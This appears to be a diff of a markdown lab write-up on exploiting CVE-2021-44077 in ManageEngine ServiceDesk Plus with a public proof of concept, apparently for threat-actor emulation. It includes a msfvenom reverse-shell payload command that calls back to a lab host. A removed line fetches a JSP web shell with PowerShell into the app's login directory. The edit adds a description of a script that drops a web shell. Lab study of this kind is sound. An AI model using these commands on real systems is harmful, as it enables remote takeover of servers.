@@ -1,12 +1,8 @@
-#### 1. Planning the Lab
 
-1. Setting Up the Lab and Donwloading a Vulnerable [ManageEngine ServiceDesk Plus Build 11303](https://archives.manageengine.com/service-desk/11303/)
-2. Exploiting the [CVE-2021-44077]([CVE-2021-44077](https://nvd.nist.gov/vuln/detail/CVE-2021-44077))
-3.
 
-#### 2. Hands On ActionExploiting [CVE-2021-44077](https://nvd.nist.gov/vuln/detail/CVE-2021-44077) Vulnerability based on POC in [GitHub](https://github.com/horizon3ai/CVE-2021-44077)
+## 1. Hands On ActionExploiting [CVE-2021-44077](https://nvd.nist.gov/vuln/detail/CVE-2021-44077) Vulnerability based on POC in [GitHub](https://github.com/horizon3ai/CVE-2021-44077)
 
-1. a. Create msiexec.exe through `msfvenom`
+### 1. a. in the POC msiexec.exe is created through `msfvenom`
 
    ```
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.20.134 LPORT=4444 -f exe > msiexec.exe
@@ -25,18 +21,23 @@
    ```
 
    ![CVE-Exploitation-Success](CVE-Exploitation-Success.png)
-2. the Next step is getting a WebShell by Downloading wpsh.jsp by this command:
 
-   ```
-   powershell.exe Invoke-WebRequest -Uri "http://192.168.20.134:9000/wpsh.jsp" -OutFile "../custom/login/wpsh.jsp"
-   ```
-   ![](download-wpsh.png)
+   #### But this approach isn't same as the report as in the report the Threat Actor dropped a web shell jsp file and then accessed it
+   
+   ![image](https://github.com/user-attachments/assets/16c25295-6f5a-465d-96b4-da499027becb)
 
-   We Got a Web Shell now!!
-   ![image](https://github.com/user-attachments/assets/51ac4558-d4a5-4ac7-b665-6f96bc5e0ab4)
+   So, i wrote a simple python Script that when executing it, a wbsh.jsp is created a the \custom\login dir
+   
+   ![image](https://github.com/user-attachments/assets/a0525bc4-dc65-4c9b-9856-110ae5456b23)
 
-3.
+   
+   then used pyinstaller to convert it to exe file
 
+   ![image](https://github.com/user-attachments/assets/cb7515a7-7eb1-49a0-b72d-5a3e834b0348)
+
+   now we got `msiexec.exe`, let's use the exploit again
+
+   
 
 
 
